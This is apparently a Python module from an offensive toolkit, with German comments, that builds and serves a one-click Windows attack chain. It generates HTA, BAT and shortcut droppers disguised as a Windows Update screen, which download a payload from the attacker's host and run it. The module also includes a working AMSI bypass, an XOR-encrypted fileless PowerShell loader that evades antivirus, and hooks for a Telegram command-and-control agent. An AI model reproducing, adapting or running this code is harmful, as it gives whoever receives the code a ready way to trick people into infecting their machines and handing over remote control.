"""
Auto-Delivery — Ein-Klick Angriffskette mit AV-Evasion.

Evasion-Techniken:
  1. XOR-verschlüsselte Payload (a.dat) — keine Signaturen auf Disk
  2. Fileless Execution — Entschlüsselung im RAM, nie als .ps1 gespeichert
  3. AMSI Bypass via Char-Arrays — keine String-Literale wie 'AmsiUtils'
  4. [scriptblock]::Create() statt IEX — weniger bekannte Signatur
  5. DownloadData (Bytes) statt DownloadString — kein AMSI-Scan beim Download
"""
from __future__ import annotations
import asyncio
import base64
import http.server
import os
import random
import threading
from datetime import datetime
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Auto-Delivery",
    description=(
        "Generiert alle Delivery-Formate (HTA/BAT/PS1) und startet HTTP-Server. "
        "Link teilen → Opfer klickt → Agent startet sofort."
    ),
    usage="LHOST eingeben, Link kopieren und teilen.",
    danger_note="⛔ BLACK — nur auf autorisierten Zielen.",
    example="http://192.168.1.10:8888/update.hta  →  Doppelklick → Agent online",
)

DANGER = DangerLevel.BLACK

# ── EXE-HTA Template (für Go-Agent — kein PowerShell) ─────────────────────────

_HTA_EXE_TEMPLATE = '''\
<html>
<head>
<HTA:APPLICATION
    APPLICATIONNAME="Windows Update Assistant"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
/>
<title>Windows Update</title>
</head>
<script language="VBScript">
Sub Window_OnLoad
    Dim sh, tmp, n
    Set sh = CreateObject("WScript.Shell")
    Randomize
    n = CStr(Int(Rnd * 89999) + 10000)
    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\\svc" & n & ".exe"
    sh.Run "cmd /c curl.exe -s -o " & Chr(34) & tmp & Chr(34) & " {EXE_URL}", 0, True
    sh.Run tmp, 0, False
    Self.Close
End Sub
</script>
<body style="background:#0078d4;color:#fff;font-family:'Segoe UI',sans-serif;margin:0;padding:40px;">
<div style="max-width:500px;margin:80px auto;text-align:center;">
<h2 style="font-weight:300;margin-bottom:8px;">Windows Update</h2>
<p style="opacity:.75;font-size:13px;">Updates werden heruntergeladen. Bitte warten...</p>
<div style="width:220px;height:3px;background:rgba(255,255,255,.25);margin:28px auto;border-radius:2px;overflow:hidden;">
<div style="width:50%;height:100%;background:#fff;border-radius:2px;animation:slide 1.5s ease-in-out infinite;"></div></div>
<p style="opacity:.5;font-size:11px;">Dieser Vorgang kann einige Minuten dauern.</p>
</div>
<style>@keyframes slide{0%{margin-left:-50%}100%{margin-left:110%}}</style>
</body>
</html>
'''

# ── AV-Evasion Helpers ─────────────────────────────────────────────────────────

def _char_arr(s: str) -> str:
    """String → PowerShell char-array. Kein String-Literal im Speicher."""
    nums = ','.join(str(ord(c)) for c in s)
    return f"([char[]]@({nums})-join'')"


def _xor_b64(data: bytes, key: int) -> str:
    """XOR-encrypt + Base64 für Transport. Server liefert unlesbaren Blob."""
    return base64.b64encode(bytes(b ^ key for b in data)).decode()


def _build_loader(dat_url: str, xor_key: int) -> str:
    """
    Fileless PS1-Loader:
      1. AMSI bypass (keine String-Literale)
      2. Download als Bytes (kein AMSI-Scan)
      3. XOR-Dekodierung im RAM
      4. Ausführung via scriptblock (kein IEX)
    """
    cls  = _char_arr("System.Management.Automation.AmsiUtils")
    fld  = _char_arr("amsiInitFailed")
    loop = "[byte[]]$(for($i=0;$i-lt$d.Length;$i++){$d[$i]-bxor$k})"
    return (
        f"$a={cls};$b={fld};"
        "[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true);"
        f"$k={xor_key};"
        f"$d=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('{dat_url}'));"
        f"$p={loop};"
        "$s=[Text.Encoding]::UTF8.GetString($p);"
        "[scriptblock]::Create($s).Invoke()"
    )


# ── Templates ──────────────────────────────────────────────────────────────────

# {PS_CMD} wird zur Laufzeit durch den generierten Loader ersetzt
_HTA_TEMPLATE = '''\
<html>
<head>
<HTA:APPLICATION
    APPLICATIONNAME="Windows Update Assistant"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
/>
<title>Windows Update</title>
</head>
<script language="VBScript">
Sub Window_OnLoad
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell.exe -w h -nop -ep bypass -c " & Chr(34) & "{PS_CMD}" & Chr(34), 0, False
    Self.Close
End Sub
</script>
<body style="background:#0078d4;color:#fff;font-family:'Segoe UI',sans-serif;margin:0;padding:40px;">
<div style="max-width:500px;margin:80px auto;text-align:center;">
<h2 style="font-weight:300;margin-bottom:8px;">Windows Update</h2>
<p style="opacity:.75;font-size:13px;">Updates werden heruntergeladen. Bitte warten...</p>
<div style="width:220px;height:3px;background:rgba(255,255,255,.25);margin:28px auto;border-radius:2px;overflow:hidden;">
<div style="width:50%;height:100%;background:#fff;border-radius:2px;animation:slide 1.5s ease-in-out infinite;"></div></div>
<p style="opacity:.5;font-size:11px;">Dieser Vorgang kann einige Minuten dauern.</p>
</div>
<style>@keyframes slide{0%{margin-left:-50%}100%{margin-left:110%}}</style>
</body>
</html>
'''

_BAT_TEMPLATE = """\
@echo off
title Windows Update
set T=%TEMP%\\svc%RANDOM%.ps1
curl.exe -s -o "%T%" {AGENT_URL}
powershell.exe -w h -nop -ep bypass -f "%T%"
"""

_LNK_BUILDER_PS1 = """\
$lnk = (New-Object -COM WScript.Shell).CreateShortcut("$env:DESKTOP\\Windows Update.lnk")
$lnk.TargetPath    = "powershell.exe"
$lnk.Arguments     = '-w h -nop -ep bypass -c "{PS_CMD}"'
$lnk.IconLocation  = "%SystemRoot%\\System32\\imageres.dll,109"
$lnk.Description   = "Windows Update"
$lnk.WorkingDirectory = "%TEMP%"
$lnk.Save()
Write-Host "[+] Shortcut auf Desktop erstellt."
"""

_README_TEMPLATE = """\
PenKit Auto-Delivery — Angriffs-Links
======================================
Generiert: {TS}
LHOST    : {LHOST}
Port     : {PORT}

=== EVASION-TECHNIK ===
  Payload: XOR-verschlüsselt (Key: {KEY}) + Base64
  Server : a.dat (unlesbarer Blob, keine PS1-Signaturen)
  Loader : AMSI-Bypass via Char-Arrays + fileless scriptblock

=== DELIVERY OPTIONEN ===

1. HTA (empfohlen — Doppelklick):
   {BASE}/update.hta
   → Windows-Update-Fake, entschlüsselt + startet Agent im RAM

2. BAT-Datei (USB / Freigabe):
   {BASE}/update.bat

3. PowerShell Loader (Chat / Mail):
   powershell -w h -nop -ep bypass -c "{PS_CMD_SHORT}..."

=== FIREWALL ===
sudo ufw allow {PORT}/tcp
"""


class AutoDelivery:
    def __init__(
        self,
        lhost: str,
        port: int = 8888,
        output_dir: str = "/tmp",
        telegram_token: str = "",
        telegram_chat_id: str = "",
        telegram_interval: int = 10,
    ):
        self.lhost     = lhost
        self.port      = port
        self.out       = output_dir
        self.token     = telegram_token
        self.chat_id   = telegram_chat_id
        self.interval  = telegram_interval
        self._xor_key  = random.randint(0x21, 0x7E)
        self._use_exe  = False
        self._server: http.server.HTTPServer | None = None
        self._running  = True
        self._visits: list[str] = []

    def _base_url(self) -> str:
        return f"http://{self.lhost}:{self.port}"

    def _dat_url(self) -> str:
        return f"{self._base_url()}/a.dat"

    def _agent_url(self) -> str:
        return f"{self._base_url()}/a.ps1"

    def _gen_agent_ps1(self) -> str | None:
        if not self.token or not self.chat_id:
            return None
        try:
            from tools.c2.telegram_agent import generate as tg_gen
            from tools.c2.c2_watcher import mark_agent_generated
            code = tg_gen(self.token, self.chat_id, self.interval)
            mark_agent_generated()
            return code
        except Exception:
            return None

    def _build_go_agent(self) -> str | None:
        """Kompiliert Go-Agent EXE. Returns path or None."""
        if not self.token or not self.chat_id:
            return None
        try:
            from tools.c2.go_agent_builder import build, is_go_available
            if not is_go_available():
                return None
            exe, _ = build(self.token, self.chat_id, self.out, self.interval)
            return exe
        except Exception:
            return None

    def _write_files(self) -> list[tuple[str, str]]:
        files = []
        exe_url  = f"{self._base_url()}/agent.exe"
        dat_url  = self._dat_url()
        loader   = _build_loader(dat_url, self._xor_key)

        # ── Primär: Go-Binary (beste AV-Evasion) ──────────────────────────────
        exe_path = self._build_go_agent()
        if exe_path:
            size = os.path.getsize(exe_path)
            files.append(("agent.exe", f"Go-Agent ({size:,} Bytes, XOR-obfuskiert)"))
            hta = _HTA_EXE_TEMPLATE.replace("{EXE_URL}", exe_url)
            self._use_exe = True
        else:
            # ── Fallback: verschlüsselte PS1-Delivery ─────────────────────────
            agent_ps1 = self._gen_agent_ps1()
            if agent_ps1:
                dat = _xor_b64(agent_ps1.encode("utf-8"), self._xor_key)
                with open(os.path.join(self.out, "a.dat"), "w") as f:
                    f.write(dat)
                files.append(("a.dat", f"XOR-verschl. PS1-Agent (Key=0x{self._xor_key:02X})"))
                with open(os.path.join(self.out, "a.ps1"), "w") as f:
                    f.write(agent_ps1)
            hta = _HTA_TEMPLATE.replace("{PS_CMD}", loader)
            self._use_exe = False

        with open(os.path.join(self.out, "update.hta"), "w") as f:
            f.write(hta)
        files.append(("update.hta", "HTA Dropper" + (" [Go-EXE]" if self._use_exe else " [PS1]")))

        bat = _BAT_TEMPLATE.replace("{AGENT_URL}", self._agent_url())
        with open(os.path.join(self.out, "update.bat"), "w") as f:
            f.write(bat)
        files.append(("update.bat", "BAT Launcher"))

        readme = _README_TEMPLATE.format(
            TS=datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
            LHOST=self.lhost, PORT=self.port, KEY=f"0x{self._xor_key:02X}",
            BASE=self._base_url(), PS_CMD_SHORT=loader[:80],
        )
        with open(os.path.join(self.out, "DELIVERY_LINKS.txt"), "w") as f:
            f.write(readme)
        files.append(("DELIVERY_LINKS.txt", "Alle Links + Erklärungen"))

        return files

    def _make_server(self):
        out_dir = self.out
        visits  = self._visits

        class Handler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *a, **kw):
                super().__init__(*a, directory=out_dir, **kw)

            def log_message(self, fmt, *args):
                ts  = datetime.now().strftime("%H:%M:%S")
                ip  = self.client_address[0]
                ua  = self.headers.get("User-Agent", "?")[:50]
                msg = fmt % args
                entry = f"[{ts}]  {ip:<16}  {msg}  {ua}"
                visits.append(entry)
                print(f"  \033[96m{entry}\033[0m")

        return http.server.HTTPServer(("0.0.0.0", self.port), Handler)

    async def start(self) -> AsyncGenerator[str, None]:
        yield "[*] Auto-Delivery startet..."
        yield f"[*] LHOST: {self.lhost}:{self.port}  →  Output: {self.out}"
        yield ""
        yield "[*] Kompiliere Go-Agent... (dauert ~10s)"

        files = self._write_files()

        mode = "Go-EXE (kein PS, kein AMSI)" if self._use_exe else "PS1 XOR-verschlüsselt (Fallback)"
        yield f"[+] Modus: {mode}"
        yield ""
        yield "[+] Delivery-Dateien generiert:"
        for name, desc in files:
            yield f"    {name:<26}  {desc}"

        self._server = self._make_server()
        t = threading.Thread(target=self._server.serve_forever, daemon=True)
        t.start()
        await asyncio.sleep(0.3)

        base = self._base_url()
        yield f"\n[+] HTTP-Server aktiv: {base}"
        yield f"\n{'─'*60}"
        yield f"  ANGRIFFS-LINK:"
        yield f"{'─'*60}"
        yield f"  HTA (Doppelklick)  :  {base}/update.hta"
        yield f"  BAT-Datei          :  {base}/update.bat"
        if self._use_exe:
            yield f"  EXE direkt         :  {base}/agent.exe"
        else:
            yield f"  Payload            :  {self._dat_url()}"
        yield f"{'─'*60}"
        yield f"\n[*] Warte auf Verbindungen... Ctrl+C zum Stoppen\n"

        try:
            while self._running:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            if self._server:
                self._server.shutdown()
            yield f"\n[*] Server gestoppt. {len(self._visits)} Requests empfangen."

    def stop(self):
        self._running = False
        if self._server:
            self._server.shutdown()
